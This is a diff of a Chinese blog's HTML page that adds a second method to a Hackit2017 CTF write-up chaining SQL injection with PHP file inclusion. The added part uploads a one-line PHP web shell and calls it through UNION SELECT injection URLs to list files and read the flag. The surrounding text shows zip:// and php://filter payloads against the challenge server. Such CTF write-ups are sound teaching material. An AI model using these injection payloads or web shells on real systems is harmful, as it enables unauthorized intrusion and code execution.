@@ -100,7 +100,9 @@
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/13.png?raw=true">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/14.png?raw=true">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/15.png?raw=true">
-<meta property="og:updated_time" content="2017-08-28T10:51:34.038Z">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/16.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/17.png?raw=true">
+<meta property="og:updated_time" content="2017-08-28T11:10:06.334Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Hackit2017-V1rus3pidem1c-writeup">
 <meta name="twitter:description" content="Hackit2017-V1rus3pidem1c-writeupsql注入php伪协议：php://filter，zip://，phar://">
@@ -428,7 +430,7 @@
 <p>base64解码一下，其中有段code：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'country'</span>]))&#123;</div><div class="line"></div><div class="line">			$link = mysqli_connect(<span class="string">"127.0.0.1"</span>, <span class="string">"beeber"</span>, <span class="string">"eouejvnbinrwviewrJNHUFEjnkwfowe"</span>, <span class="string">"WHATAREYOUDOINGHERE"</span>);</div><div class="line"></div><div class="line">			$result = mysqli_query($link, <span class="string">"SELECT scriptPath FROM countries WHERE countryName='"</span>.$_GET[<span class="string">'country'</span>].<span class="string">"';"</span>);</div><div class="line">			$res_include = $result-&gt;fetch_object()-&gt;scriptPath;</div><div class="line">			<span class="comment">//echo 'Get file: '.$res_include.'&lt;br&gt;&lt;br&gt;';</span></div><div class="line"></div><div class="line">			<span class="keyword">include</span> $res_include;</div><div class="line"></div><div class="line"></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
 <p>include哪一个页面是根据从数据库中取出的脚本的路径决定的。根据我们前面利用脚本注出来的结果，我们看看country/ge.php中的源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">	$target_dir = <span class="string">"uploads/"</span>;</div><div class="line">	$target_file = $target_dir . basename($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]);</div><div class="line">	move_uploaded_file($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"tmp_name"</span>], $target_file);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
 <p>从country/ge.php源码中，我们知道了文件上传后保存在uploads文件夹下，文件名也没有改变。</p>
-<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p>直接上传php文件再去访问uploads下的文件是无法解析的。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/14.png?raw=true" alt=""></p>
+<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><h3 id="姿势一"><a href="#姿势一" class="headerlink" title="姿势一"></a>姿势一</h3><p>直接上传php文件再去访问uploads下的文件是无法解析的。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/14.png?raw=true" alt=""></p>
 <p>可以利用zip协议或者phar协议来进行文件包含。</p>
 <p>chybeta.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	system(<span class="string">'ls'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
 <p>打包成chybeta.zip，上传后访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?country=&apos; union select &apos;zip://uploads/chybeta.zip%23chybeta.php&apos; -- -</div></pre></td></tr></table></figure></p>
@@ -436,6 +438,11 @@
 <p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/15.png?raw=true" alt=""></p>
 <p>接下去我们利用php伪协议读取iulersiueruigfuihseruhgi.php的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?country=&apos; union select &apos;php://filter/read=convert.base64-encode/resource=iulersiueruigfuihseruhgi.php</div></pre></td></tr></table></figure></p>
 <p>解码后得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">h4ck1t&#123;$QL&amp;LFI=FR13ND$&#125;</div></pre></td></tr></table></figure></p>
+<h3 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二"></a>姿势二</h3><p>chybeta.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	system($_GET[<span class="string">'chybeta'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>上传后可以直接访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?chybeta=ls&amp;country=&apos; union select &apos;uploads/chybeta.php&apos; -- -</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/16.png?raw=true" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">view-source:http://tasks.ctf.com.ua:13372/index.php?chybeta=cat iulersiueruigfuihseruhgi.php&amp;country=&apos; union select &apos;uploads/chybeta.php&apos; -- -</div></pre></td></tr></table></figure>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/17.png?raw=true" alt=""></p>
 
       
     </div>
@@ -451,7 +458,7 @@
   <p><span>本文标题:</span><a href="/2017/08/28/Hackit2017-V1rus3pidem1c-writeup/">Hackit2017-V1rus3pidem1c-writeup</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
   <p><span>发布时间:</span>2017年08月28日 - 15:08</p>
-  <p><span>最后更新:</span>2017年08月28日 - 18:08</p>
+  <p><span>最后更新:</span>2017年08月28日 - 19:08</p>
   <p><span>原始链接:</span><a href="/2017/08/28/Hackit2017-V1rus3pidem1c-writeup/" title="Hackit2017-V1rus3pidem1c-writeup">http://yoursite.com/2017/08/28/Hackit2017-V1rus3pidem1c-writeup/</a>
     <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2017/08/28/Hackit2017-V1rus3pidem1c-writeup/"  aria-label="复制成功！"></i></span>
   </p>
@@ -533,8 +540,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/3017/07/26/一些文章/" rel="prev" title="一些文章">
-                一些文章 <i class="fa fa-chevron-right"></i>
+              <a href="/2017/08/28/Hackit2017-Weekands-of-hacker-writeup/" rel="prev" title="Hackit2017-Weekands of hacker-writeup">
+                Hackit2017-Weekands of hacker-writeup <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -607,7 +614,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">108</span>
+                <span class="site-state-item-count">109</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -713,7 +720,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Task"><span class="nav-number">1.</span> <span class="nav-text">Task</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Solution"><span class="nav-number">2.</span> <span class="nav-text">Solution</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql注入"><span class="nav-number">2.1.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读取源码"><span class="nav-number">2.2.</span> <span class="nav-text">读取源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getflag"><span class="nav-number">2.3.</span> <span class="nav-text">getflag</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Task"><span class="nav-number">1.</span> <span class="nav-text">Task</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Solution"><span class="nav-number">2.</span> <span class="nav-text">Solution</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql注入"><span class="nav-number">2.1.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读取源码"><span class="nav-number">2.2.</span> <span class="nav-text">读取源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getflag"><span class="nav-number">2.3.</span> <span class="nav-text">getflag</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#姿势一"><span class="nav-number">2.3.1.</span> <span class="nav-text">姿势一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#姿势二"><span class="nav-number">2.3.2.</span> <span class="nav-text">姿势二</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
